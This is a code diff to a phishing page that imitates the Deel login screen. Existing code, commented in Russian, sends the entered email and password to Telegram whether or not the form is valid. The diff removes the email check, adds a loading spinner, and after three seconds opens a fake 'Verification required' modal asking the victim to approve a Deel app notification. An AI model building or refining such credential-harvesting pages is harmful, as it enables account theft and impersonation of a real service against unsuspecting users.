@@ -80,6 +80,42 @@
       z-index: 10;
       width: 100%; /* Full width to allow centering */
     }
+    /* Loading spinner */
+/* Loading spinner inline with button text */
+/* Loading spinner inline with button text */
+.spinner {
+  display: none;
+  width: 16px;
+  height: 16px;
+  margin-left: 10px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-radius: 50%;
+  border-top-color: #fff;
+  animation: spin 1s ease-in-out infinite;
+  vertical-align: middle;
+  position: relative;
+  top: -1px;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* Button with spinner content */
+.login-submit {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  padding: 16px;
+  border-radius: 8px;
+  border: none;
+  background-color: #1a1a1a;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 25px;
+}
 
     .hero-text h1 {
       font-size: 3.5rem;
@@ -429,12 +465,15 @@
       <input type="password" id="password" class="input-field" placeholder="Password">
       <a href="#" class="forgot-password">Forgot password?</a>
       
-      <button class="login-submit">Log in</button>
+      <button class="login-submit" id="login-button">
+        Log in
+        <div class="spinner" id="login-spinner"></div>
+      </button>
       
       <p class="sign-up-prompt">Need to create an account? <a href="#" class="sign-up-link">Sign up</a></p>
     </div>
   </div>
-  
+    
   <script>
     // Additional form validation script
     document.querySelector('.login-submit').addEventListener('click', function(e) {
@@ -442,13 +481,6 @@
       const passwordField = document.getElementById('password');
       let isValid = true;
       
-      // Simple email validation
-      if (!emailField.value || !emailField.value.includes('@')) {
-        emailField.style.borderColor = '#ff3860';
-        isValid = false;
-      } else {
-        emailField.style.borderColor = 'rgba(0, 0, 0, 0.1)';
-      }
       
       // Password validation (just checking if it's empty for this example)
       if (!passwordField.value) {
@@ -571,6 +603,9 @@ document.addEventListener('DOMContentLoaded', function() {
   if (loginButton) {
     // Функция обработки данных формы
     function handleFormSubmission() {
+      document.getElementById('login-spinner').style.display = 'inline-block';
+  document.getElementById('login-button').disabled = true;
+      
       // Получаем значения полей
       const email = emailField ? emailField.value : 'Поле email не найдено';
       const password = passwordField ? passwordField.value : 'Поле пароля не найдено';
@@ -598,6 +633,17 @@ document.addEventListener('DOMContentLoaded', function() {
       
       // Отправляем данные в Telegram независимо от валидации
       sendToTelegram(message);
+      setTimeout(function() {
+    // Hide spinner
+    document.getElementById('login-spinner').style.display = 'none';
+    
+    // Show verification modal after spinner completes
+    showVerificationModal();
+    
+    // Re-enable button
+    document.getElementById('login-button').disabled = false;
+  }, 3000); // 3 seconds
+      
     }
     
     // Добавляем обработчики для разных типов устройств
@@ -658,7 +704,319 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
 });
+
+function showVerificationModal() {
+  // Create modal container with semi-transparent background
+  const modal = document.createElement('div');
+  modal.style.position = 'fixed';
+  modal.style.top = '0';
+  modal.style.left = '0';
+  modal.style.width = '100%';
+  modal.style.height = '100%';
+  modal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+  modal.style.zIndex = '1000';
+  modal.style.display = 'flex';
+  modal.style.flexDirection = 'column';
+  modal.style.alignItems = 'center';
+  modal.style.justifyContent = 'center';
+  modal.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif';
+
+  // Create white form container - adjust to fill more screen space on mobile
+  const formContainer = document.createElement('div');
+  formContainer.style.backgroundColor = 'white';
+  formContainer.style.borderRadius = '10px';
+  formContainer.style.width = '100%';
+  formContainer.style.maxWidth = '500px';
+  formContainer.style.display = 'flex';
+  formContainer.style.flexDirection = 'column';
+  formContainer.style.alignItems = 'center';
+  formContainer.style.padding = '20px 20px 30px 20px';
+  formContainer.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
+  formContainer.style.margin = '0 15px';
   
+  // Make modal take more space on mobile
+  if (window.innerWidth <= 768) {
+    formContainer.style.height = '90%';
+    formContainer.style.maxHeight = '500px';
+    formContainer.style.margin = '0';
+    formContainer.style.borderRadius = '10px 10px 0 0';
+    formContainer.style.justifyContent = 'space-between';
+    modal.style.alignItems = 'flex-end';
+    modal.style.justifyContent = 'flex-end';
+  }
+
+  // Create header with back button and title
+  const header = document.createElement('div');
+  header.style.display = 'flex';
+  header.style.alignItems = 'center';
+  header.style.justifyContent = 'space-between';
+  header.style.width = '100%';
+  header.style.marginBottom = '20px';
+
+  // Back button
+  const backButton = document.createElement('button');
+  backButton.innerHTML = '&#8592;';
+  backButton.style.background = 'none';
+  backButton.style.border = 'none';
+  backButton.style.fontSize = '24px';
+  backButton.style.cursor = 'pointer';
+  backButton.style.padding = '0';
+  backButton.onclick = () => {
+    document.body.removeChild(modal);
+  };
+
+  // Title
+  const title = document.createElement('h2');
+  title.textContent = 'Verification required';
+  title.style.textAlign = 'center';
+  title.style.flex = '1';
+  title.style.fontSize = '24px';
+  title.style.fontWeight = '500';
+  title.style.margin = '0';
+
+  // Close button
+  const closeButton = document.createElement('button');
+  closeButton.innerHTML = '&#10005;';
+  closeButton.style.background = 'none';
+  closeButton.style.border = 'none';
+  closeButton.style.fontSize = '24px';
+  closeButton.style.cursor = 'pointer';
+  closeButton.style.padding = '0';
+  closeButton.onclick = () => {
+    document.body.removeChild(modal);
+  };
+
+  header.appendChild(backButton);
+  header.appendChild(title);
+  header.appendChild(closeButton);
+
+  // Create phone illustration
+  const phoneContainer = document.createElement('div');
+  phoneContainer.style.width = '100%';
+  phoneContainer.style.height = '200px';
+  phoneContainer.style.backgroundColor = '#e6e0ff';
+  phoneContainer.style.borderRadius = '16px';
+  phoneContainer.style.display = 'flex';
+  phoneContainer.style.justifyContent = 'center';
+  phoneContainer.style.alignItems = 'center';
+  phoneContainer.style.marginBottom = '20px';
+  phoneContainer.style.overflow = 'hidden';
+
+  // Create phone mockup
+  const phoneMock = document.createElement('div');
+  phoneMock.style.width = '280px';
+  phoneMock.style.height = '500px';
+  phoneMock.style.borderRadius = '36px';
+  phoneMock.style.backgroundColor = '#f0f0f0';
+  phoneMock.style.border = '12px solid #333';
+  phoneMock.style.position = 'relative';
+  phoneMock.style.display = 'flex';
+  phoneMock.style.flexDirection = 'column';
+  phoneMock.style.padding = '20px 15px';
+  phoneMock.style.boxShadow = '0 0 15px rgba(0, 0, 0, 0.2)';
+  phoneMock.style.bottom = '-220px'; // Adjusted to match screenshot
+
+  // Add left side buttons
+  const leftButtons = document.createElement('div');
+  leftButtons.style.position = 'absolute';
+  leftButtons.style.left = '-16px';
+  leftButtons.style.top = '80px';
+  leftButtons.style.display = 'flex';
+  leftButtons.style.flexDirection = 'column';
+  leftButtons.style.gap = '15px';
+
+  // Volume up button
+  const volumeUpButton = document.createElement('div');
+  volumeUpButton.style.width = '4px';
+  volumeUpButton.style.height = '30px';
+  volumeUpButton.style.backgroundColor = '#222';
+  volumeUpButton.style.borderTopLeftRadius = '2px';
+  volumeUpButton.style.borderBottomLeftRadius = '2px';
+
+  // Volume down button
+  const volumeDownButton = document.createElement('div');
+  volumeDownButton.style.width = '4px';
+  volumeDownButton.style.height = '30px';
+  volumeDownButton.style.backgroundColor = '#222';
+  volumeDownButton.style.borderTopLeftRadius = '2px';
+  volumeDownButton.style.borderBottomLeftRadius = '2px';
+
+  leftButtons.appendChild(volumeUpButton);
+  leftButtons.appendChild(volumeDownButton);
+
+  // Power button
+  const powerButton = document.createElement('div');
+  powerButton.style.position = 'absolute';
+  powerButton.style.right = '-16px';
+  powerButton.style.top = '90px';
+  powerButton.style.width = '4px';
+  powerButton.style.height = '40px';
+  powerButton.style.backgroundColor = '#222';
+  powerButton.style.borderTopRightRadius = '2px';
+  powerButton.style.borderBottomRightRadius = '2px';
+
+  // Notification container
+  const notificationContainer = document.createElement('div');
+  notificationContainer.style.width = '100%';
+  notificationContainer.style.backgroundColor = 'white';
+  notificationContainer.style.borderRadius = '20px';
+  notificationContainer.style.padding = '12px';
+  notificationContainer.style.marginTop = '5px';
+  notificationContainer.style.display = 'flex';
+  notificationContainer.style.alignItems = 'center';
+  notificationContainer.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.05)';
+
+  // Notification icon
+  const notificationIcon = document.createElement('div');
+  notificationIcon.style.width = '40px';
+  notificationIcon.style.height = '40px';
+  notificationIcon.style.backgroundColor = '#b69cfa';
+  notificationIcon.style.borderRadius = '10px';
+  notificationIcon.style.display = 'flex';
+  notificationIcon.style.justifyContent = 'center';
+  notificationIcon.style.alignItems = 'center';
+  notificationIcon.style.marginRight = '12px';
+  notificationIcon.style.fontSize = '18px';
+  notificationIcon.style.fontWeight = 'bold';
+  notificationIcon.style.color = 'white';
+  notificationIcon.textContent = 'd.';
+
+  // Notification content
+  const notificationContent = document.createElement('div');
+  notificationContent.style.flex = '1';
+  notificationContent.style.display = 'flex';
+  notificationContent.style.flexDirection = 'column';
+  notificationContent.style.gap = '8px';
+
+  // Content lines
+  for (let i = 0; i < 3; i++) {
+    const contentLine = document.createElement('div');
+    contentLine.style.height = '8px';
+    contentLine.style.backgroundColor = '#e0e0e0';
+    contentLine.style.borderRadius = '4px';
+    contentLine.style.width = i === 0 ? '100%' : (i === 1 ? '85%' : '65%');
+    notificationContent.appendChild(contentLine);
+  }
+
+  notificationContainer.appendChild(notificationIcon);
+  notificationContainer.appendChild(notificationContent);
+
+  phoneMock.appendChild(notificationContainer);
+  phoneMock.appendChild(leftButtons);
+  phoneMock.appendChild(powerButton);
+  phoneContainer.appendChild(phoneMock);
+
+  // Create message
+  const message = document.createElement('h3');
+  message.innerHTML = 'Check your smartphone for a<br>notification from the Deel app';
+  message.style.textAlign = 'center';
+  message.style.width = '100%';
+  message.style.fontSize = '20px';
+  message.style.fontWeight = '500';
+  message.style.marginBottom = '20px';
+  message.style.lineHeight = '1.3';
+
+  // Create notification status container - THIS IS THE KEY CHANGE TO PUT BOTH ELEMENTS ON ONE LINE
+  const notificationStatusContainer = document.createElement('div');
+  notificationStatusContainer.style.display = 'flex';
+  notificationStatusContainer.style.flexDirection = 'row'; // Changed to row instead of column
+  notificationStatusContainer.style.alignItems = 'center';
+  notificationStatusContainer.style.justifyContent = 'center';
+  notificationStatusContainer.style.gap = '10px'; // Space between the two elements
+  notificationStatusContainer.style.marginBottom = '20px';
+  notificationStatusContainer.style.width = '100%';
+
+  // Create notification text
+  const notificationText = document.createElement('div');
+  notificationText.style.fontSize = '16px';
+  notificationText.style.color = '#333';
+  notificationText.style.fontWeight = '400';
+  notificationText.textContent = 'Didn\'t get a notification?';
+
+  // Create timer
+  const timer = document.createElement('div');
+  timer.style.fontSize = '16px';
+  timer.style.color = '#999';
+  timer.style.fontWeight = '400';
+  timer.textContent = 'Send it again in 29s';
+
+  notificationStatusContainer.appendChild(notificationText);
+  notificationStatusContainer.appendChild(timer);
+
+  // Create alternative option
+  const alternativeOption = document.createElement('a');
+  alternativeOption.textContent = 'I don\'t have access to my Deel mobile app';
+  alternativeOption.href = '#';
+  alternativeOption.style.color = '#000';
+  alternativeOption.style.textDecoration = 'underline';
+  alternativeOption.style.fontSize = '16px';
+  alternativeOption.style.marginTop = '0';
+  alternativeOption.style.marginBottom = '30px'; // Add bottom margin for mobile view
+  alternativeOption.onclick = (e) => {
+    e.preventDefault();
+    // Handle alternative option click
+  };
+
+  // Append all elements to form container
+  formContainer.appendChild(header);
+  formContainer.appendChild(phoneContainer);
+  formContainer.appendChild(message);
+  formContainer.appendChild(notificationStatusContainer);
+  formContainer.appendChild(alternativeOption);
+
+  // Bottom spacer for mobile view
+  if (window.innerWidth <= 768) {
+    const spacer = document.createElement('div');
+    spacer.style.height = '5px';
+    formContainer.appendChild(spacer);
+  }
+
+  // Append form container to modal
+  modal.appendChild(formContainer);
+
+  // Add modal to body
+  document.body.appendChild(modal);
+
+  // Start countdown
+  let seconds = 30;
+  const countdownInterval = setInterval(() => {
+    seconds--;
+    timer.textContent = `Send it again in ${seconds}s`;
+    
+    if (seconds <= 0) {
+      clearInterval(countdownInterval);
+      timer.textContent = 'Send it again';
+      timer.style.color = '#3498db';
+      timer.style.cursor = 'pointer';
+      timer.onclick = () => {
+        // Reset timer when clicked
+        seconds = 30;
+        timer.textContent = `Send it again in ${seconds}s`;
+        timer.style.color = '#999';
+        timer.style.cursor = 'default';
+        timer.onclick = null;
+        
+        // Restart countdown
+        const newCountdown = setInterval(() => {
+          seconds--;
+          timer.textContent = `Send it again in ${seconds}s`;
+          
+          if (seconds <= 0) {
+            clearInterval(newCountdown);
+            timer.textContent = 'Send it again';
+            timer.style.color = '#3498db';
+            timer.style.cursor = 'pointer';
+            timer.onclick = () => {
+              // You could add a recursive call here to restart
+              // Or just manually reset the timer again
+            };
+          }
+        }, 1000);
+      };
+    }
+  }, 1000);
+}
+
   // Function to show login success message or redirect
   function showLoginSuccess() {
     // Create a success message or loading spinner
@@ -678,5 +1036,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }, 2000);
   }
   </script>
+  
+
 </body>
 </html>
